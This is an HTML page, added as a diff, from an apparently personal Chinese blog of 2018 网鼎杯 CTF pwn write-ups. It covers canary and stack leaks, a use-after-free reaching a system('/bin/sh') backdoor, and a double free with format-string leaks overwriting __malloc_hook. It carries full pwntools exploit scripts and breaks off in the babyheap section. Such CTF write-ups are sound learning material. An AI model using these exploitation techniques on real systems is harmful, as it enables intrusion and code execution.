@@ -1,0 +1,1109 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="网鼎杯pwn部分wp水了一波网鼎，菜死～～～～ guess 题目  很直接的一个题目，运行后提示缺少flag文件，目测flag在内存中  创建flag文件后，运行直接让猜flag,输入超长串后直接stack smashing，而且没有结束   ida查看程序，发现程序有四次fork机会     解题思路  canary的玩法公开的有 循环fork的程序，直接单字节爆破canary 通过覆盖栈上的环">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯pwn部分wp">
+<meta property="og:url" content="http://yoursite.com/2018/08/30/网鼎杯pwn部分wp/index.html">
+<meta property="og:site_name" content="greyd0g&#39; blog">
+<meta property="og:description" content="网鼎杯pwn部分wp水了一波网鼎，菜死～～～～ guess 题目  很直接的一个题目，运行后提示缺少flag文件，目测flag在内存中  创建flag文件后，运行直接让猜flag,输入超长串后直接stack smashing，而且没有结束   ida查看程序，发现程序有四次fork机会     解题思路  canary的玩法公开的有 循环fork的程序，直接单字节爆破canary 通过覆盖栈上的环">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2018/08/30/5b880207b07d3.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/30/5b8802046cc6b.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/30/5b880810e7edd.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/30/5b880810e95f9.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/30/5b8808180ecea.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/30/5b88081145f02.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/30/5b880810eacf0.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/30/5b880188b87fa.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/30/5b88018860868.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/30/5b88018815f0b.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/30/5b880187d35f5.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/28/5b84ccd988e0b.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/28/5b84d1ea90ae2.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/28/5b84cffce8fe4.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/28/5b84d085a2fbb.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/28/5b84d0e2be53a.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/28/5b84d25676e85.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/28/5b84d2a8a3c6a.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/28/5b84d31b82ef2.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/28/5b84d39ac8267.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/28/5b84d46c51739.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/28/5b84d46c44f59.png">
+<meta property="og:image" content="https://i.loli.net/2018/08/28/5b84d40fad5f7.png">
+<meta property="og:updated_time" content="2018-08-30T15:37:32.574Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="网鼎杯pwn部分wp">
+<meta name="twitter:description" content="网鼎杯pwn部分wp水了一波网鼎，菜死～～～～ guess 题目  很直接的一个题目，运行后提示缺少flag文件，目测flag在内存中  创建flag文件后，运行直接让猜flag,输入超长串后直接stack smashing，而且没有结束   ida查看程序，发现程序有四次fork机会     解题思路  canary的玩法公开的有 循环fork的程序，直接单字节爆破canary 通过覆盖栈上的环">
+<meta name="twitter:image" content="https://i.loli.net/2018/08/30/5b880207b07d3.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/08/30/网鼎杯pwn部分wp/"/>
+
+
+
+
+
+  <title>网鼎杯pwn部分wp | greyd0g' blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">greyd0g' blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">good good study</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            友情链接
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/30/网鼎杯pwn部分wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="greyd0g">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="greyd0g' blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">网鼎杯pwn部分wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-30T23:32:58+08:00">
+                2018-08-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/08/30/网鼎杯pwn部分wp/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2018/08/30/网鼎杯pwn部分wp/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="网鼎杯pwn部分wp"><a href="#网鼎杯pwn部分wp" class="headerlink" title="网鼎杯pwn部分wp"></a>网鼎杯pwn部分wp</h1><pre><code>水了一波网鼎，菜死～～～～
+</code></pre><h1 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h1><ul>
+<li><p>题目</p>
+<ul>
+<li><p>很直接的一个题目，运行后提示缺少flag文件，目测flag在内存中</p>
+</li>
+<li><p>创建flag文件后，运行直接让猜flag,输入超长串后直接stack smashing，而且没有结束</p>
+<p><img src="https://i.loli.net/2018/08/30/5b880207b07d3.png" alt="guess.png"></p>
+</li>
+<li><p>ida查看程序，发现程序有四次fork机会</p>
+<p><img src="https://i.loli.net/2018/08/30/5b8802046cc6b.png" alt="guess1.png"></p>
+</li>
+</ul>
+</li>
+<li><p>解题思路</p>
+<ul>
+<li>canary的玩法公开的有<ul>
+<li>循环fork的程序，直接单字节爆破canary</li>
+<li>通过覆盖栈上的环境变量，leak 内存数据！！！！</li>
+<li>覆盖线程的canary</li>
+</ul>
+</li>
+<li>一开始一直在想办法绕过canary做rop，以为又是什么新姿势</li>
+<li>吃饭的时候突然想到四次leak足够我们拿到flag，got-&gt;libc-&gt;stack-&gt;flag</li>
+</ul>
+</li>
+<li><p>exp</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'sp'</span>,<span class="string">'-h'</span>,<span class="string">'-l'</span>,<span class="string">'105'</span>]</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r = <span class="keyword">lambda</span> x:p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>:p.recvline</span><br><span class="line">ru = <span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:p.recvuntil(x,drop=<span class="keyword">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:p.recvn(x)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">print</span> <span class="string">'pidof is %s '</span> % pidof(p)</span><br><span class="line">  raw_input(<span class="string">'waiting for debug'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makep</span><span class="params">(ip=<span class="string">''</span>,port=<span class="number">0</span>,binary=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">and</span> port:</span><br><span class="line">        p = remote(ip,port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process(binary)</span><br><span class="line"></span><br><span class="line">makep(binary=<span class="string">'./guess'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">ru(<span class="string">'Please type your guessing flag\n'</span>)</span><br><span class="line">sl(p64(<span class="number">0x6020a0</span>)*<span class="number">0x100</span>)</span><br><span class="line">ru(<span class="string">'*** stack smashing detected ***: '</span>)</span><br><span class="line">libc.address = u64(rn(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">environ = libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line">log.success(<span class="string">'environ:'</span>+hex(environ))</span><br><span class="line">ru(<span class="string">'Please type your guessing flag\n'</span>)</span><br><span class="line">sl(p64(environ)*<span class="number">0x100</span>)</span><br><span class="line">ru(<span class="string">'*** stack smashing detected ***: '</span>)</span><br><span class="line">stack = u64(rn(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'stack:'</span>+hex(stack))   </span><br><span class="line">ru(<span class="string">'Please type your guessing flag\n'</span>)</span><br><span class="line">sl(p64(stack<span class="number">-0x168</span>)*<span class="number">0x100</span>)</span><br><span class="line">ru(<span class="string">'*** stack smashing detected ***: '</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h1><ul>
+<li><p>题目</p>
+<ul>
+<li><p>简单明了的堆题 ，提供new change release三个选项</p>
+</li>
+<li><p>没开pie。。。,有一个调用system（/bin/sh）函数</p>
+</li>
+</ul>
+</li>
+<li><p>漏洞位置</p>
+<ul>
+<li><p>在release选项中存在uaf，只能release 3次</p>
+<p><img src="https://i.loli.net/2018/08/30/5b880810e7edd.png" alt="blind.png"></p>
+</li>
+<li><p>限制条件，堆申请大小固定为0x68，最多6个</p>
+<p><img src="https://i.loli.net/2018/08/30/5b880810e95f9.png" alt="blind1.png"></p>
+</li>
+</ul>
+</li>
+<li><p>利用思路</p>
+<ul>
+<li>通过uaf拿到bss段地址</li>
+<li>修改存放在bss上的file指针</li>
+</ul>
+</li>
+<li><p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./blind'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'106.75.20.44'</span> , <span class="number">9999</span>)<span class="comment">#nc 106.75.20.44 9999</span></span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index , content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(index , content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">release</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> pidof(p)[<span class="number">0</span>]</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">back_door = <span class="number">0x4008E3</span></span><br><span class="line">fake_heap = <span class="number">0x601fe5</span></span><br><span class="line">new(<span class="number">0</span> , <span class="string">'A'</span>*<span class="number">0x8</span> )         <span class="comment">#00</span></span><br><span class="line">new(<span class="number">1</span> , p64(<span class="number">0x4008e3</span>)*<span class="number">12</span> )         <span class="comment">#01</span></span><br><span class="line">new(<span class="number">2</span> , <span class="string">'C'</span>*<span class="number">0x8</span> )         <span class="comment">#02</span></span><br><span class="line">release(<span class="number">0</span>)</span><br><span class="line">release(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x601ff5</span> ))</span><br><span class="line">new(<span class="number">3</span> , <span class="string">'\x01'</span>*<span class="number">0x8</span> )         <span class="comment">#00</span></span><br><span class="line">debug()</span><br><span class="line">new(<span class="number">4</span> , <span class="string">'\x00'</span>*<span class="number">0x13</span>+p64(<span class="number">0x6020f0</span>)+p64(<span class="number">0x601f90</span>))         <span class="comment">#00</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="easycoin"><a href="#easycoin" class="headerlink" title="easycoin"></a>easycoin</h1><ul>
+<li><p>题目</p>
+<ul>
+<li><p>一道很类似于记账系统的提，RELRO 终于不是full了</p>
+</li>
+<li><p>首先需要注册用户，才能登入内部选单</p>
+</li>
+<li><p>内部选单提供了转账 ，查询转账信息，查询用户信息，删除用户等功能</p>
+<p><img src="https://i.loli.net/2018/08/30/5b8808180ecea.png" alt="easycoin.png"></p>
+</li>
+</ul>
+</li>
+<li><p>漏洞位置</p>
+<ul>
+<li><p>看了好久都没发现，在把玩时，发现可以给自己转账，删除账户时报double free</p>
+</li>
+<li><p>全局变量有一个用户链表，用户链表的结构体中，有一条单链表记录转账信息</p>
+<p><img src="https://i.loli.net/2018/08/30/5b88081145f02.png" alt="easycoin1.png"></p>
+</li>
+<li><p>在删除用户时，首先清除转账信息链表，也会同时摘除其他用户维护的链表</p>
+</li>
+<li><p>而在删除函数中临时指针没有检测用户自身链表是否改变可以导致double free</p>
+<p><img src="https://i.loli.net/2018/08/30/5b880810eacf0.png" alt="easycoin2.png"></p>
+</li>
+</ul>
+</li>
+<li><p>利用思路</p>
+<ul>
+<li>利用double free改变fastbin fd 拿到bss指针</li>
+<li>修改bss段上的列表达到任意写</li>
+</ul>
+</li>
+<li><p>exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">context.terminal = [&apos;tmux&apos;,&apos;sp&apos;,&apos;-h&apos;,&apos;-l&apos;,&apos;105&apos;]</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">r = lambda x:p.recv(x)</span><br><span class="line">rl = lambda:p.recvline</span><br><span class="line">ru = lambda x:p.recvuntil(x)</span><br><span class="line">rud = lambda x:p.recvuntil(x,drop=True)</span><br><span class="line">s = lambda x:p.send(x)</span><br><span class="line">sl = lambda x:p.sendline(x)</span><br><span class="line">sla = lambda x,y:p.sendlineafter(x,y)</span><br><span class="line">rn = lambda x:p.recvn(x)</span><br><span class="line">sa = lambda x,y:p.sendafter(x,y)</span><br><span class="line">slocal = 1</span><br><span class="line">def hint():</span><br><span class="line">  print &apos;pidof is %s &apos; % pidof(p)</span><br><span class="line">  raw_input(&apos;waiting for debug&apos;)</span><br><span class="line">def makep(ip=&apos;&apos;,port=0,binary=&apos;&apos;):</span><br><span class="line">  global p</span><br><span class="line">  if 1:</span><br><span class="line">      p = process(binary)</span><br><span class="line">  else:</span><br><span class="line">      p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">def register(name , passwd):</span><br><span class="line">    sla(&quot;&gt; &quot;, &apos;1&apos;)</span><br><span class="line">    sla(&quot;&gt; &quot;, name)</span><br><span class="line">    sla(&quot;&gt; &quot;, passwd)</span><br><span class="line">    sla(&quot;&gt; &quot;, passwd)</span><br><span class="line"></span><br><span class="line">def login(name , passwd):</span><br><span class="line">    sla(&quot;&gt; &quot;, &apos;2&apos;)</span><br><span class="line">    sla(&quot;&gt; &quot;, name)</span><br><span class="line">    sla(&quot;&gt; &quot;, name)</span><br><span class="line"></span><br><span class="line">def leak(fmt):</span><br><span class="line">    sa(&quot;&gt; &quot;, fmt)</span><br><span class="line">    ru(&quot;Command: &quot;);</span><br><span class="line">    data = rn(len(&apos;0x7fd700e692c0&apos;))</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">def  send_coin(user,many):</span><br><span class="line">    sla(&quot;&gt; &quot;, &apos;2&apos;)</span><br><span class="line">    sla(&quot;&gt; &quot;, user)</span><br><span class="line">    sla(&quot;&gt; &quot;, many)</span><br><span class="line"></span><br><span class="line">def change_pass(passwd):</span><br><span class="line">    sla(&quot;&gt; &quot;, &apos;4&apos;)</span><br><span class="line">    sla(&quot;&gt; &quot;, passwd)</span><br><span class="line"></span><br><span class="line">def log_out():</span><br><span class="line">    sla(&quot;&gt; &quot;, &apos;6&apos;)</span><br><span class="line"></span><br><span class="line">def dele_user(name):</span><br><span class="line">    sla(&quot;&gt; &quot;, &apos;5&apos;)</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    libc = ELF(&apos;./libc-2.23.so&apos;)</span><br><span class="line">    makep(binary=&quot;./EasyCoin&quot;)</span><br><span class="line">    register(&apos;AAAA&apos;,&quot;AAAA&quot;)</span><br><span class="line">    register(&apos;BBBB&apos;,&quot;BBBB&quot;)</span><br><span class="line">    register(&apos;CCCC&apos;,&quot;CCCC&quot;)</span><br><span class="line">    login(&apos;CCCC&apos;,&quot;CCCC&quot;)</span><br><span class="line">    for x in xrange(0x2f):</span><br><span class="line">        send_coin(&apos;CCCC&apos;,&apos;1&apos;)</span><br><span class="line">    log_out()</span><br><span class="line">    login(&apos;AAAA&apos;,&quot;AAAA&quot;)</span><br><span class="line">    libc.address = int(leak(&apos;%3$p&apos;),16) - 0xf72c0</span><br><span class="line">    heap = int(leak(&apos;%9$p&apos;)[:len(&apos;0x154b000&apos;)], 16) </span><br><span class="line">    success(&quot;libc is &quot; + hex(libc.address))</span><br><span class="line">    success(&quot;heap  is &quot; + hex(heap))</span><br><span class="line">    send_coin(&apos;BBBB&apos;,str(heap+0xf0))</span><br><span class="line">    log_out()</span><br><span class="line">    login(&apos;BBBB&apos;,&quot;BBBB&quot;)</span><br><span class="line">    change_pass(&apos;\x00&apos;*0x10+p64(0x30))</span><br><span class="line">    send_coin(&apos;BBBB&apos;,&apos;1000&apos;)</span><br><span class="line">    dele_user(&apos;BBBB&apos;)</span><br><span class="line">    login(&apos;CCCC&apos;,&apos;CCCC&apos;)</span><br><span class="line">    send_coin(&apos;CCCC&apos;,&apos;1&apos;)</span><br><span class="line">    log_out()</span><br><span class="line">    register(p64(0x6030e0),&apos;oooo&apos;)</span><br><span class="line">    payload = &apos;1&apos;*16 + p64(0x603100) + p64(libc.symbols[&apos;__malloc_hook&apos;])</span><br><span class="line">    sla(&quot;&gt; &quot;, &apos;1&apos;)</span><br><span class="line">    sla(&quot;&gt; &quot;, &apos;1&apos;*16)</span><br><span class="line">    sa(&quot;&gt; &quot;, payload[0:31])</span><br><span class="line">    sa(&quot;&gt; &quot;, &apos;1&apos;*16+&apos;\x0a&apos;)</span><br><span class="line">    hint()</span><br><span class="line">    login(p64(0x603100),&apos;&apos;)</span><br><span class="line">    change_pass(p64(libc.address+0xf02a4 ))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><ul>
+<li><p>题目</p>
+<ul>
+<li><p>一如既往的baby题。。。</p>
+</li>
+<li><p>常规选单题，提供堆申请，释放，内容编辑，内容展示选项</p>
+</li>
+<li><p>仁慈的没开pie</p>
+<p><img src="https://i.loli.net/2018/08/30/5b880188b87fa.png" alt="babyheap.png"></p>
+</li>
+</ul>
+</li>
+<li><p>漏洞位置</p>
+<ul>
+<li><p>在删除处存在一处uaf</p>
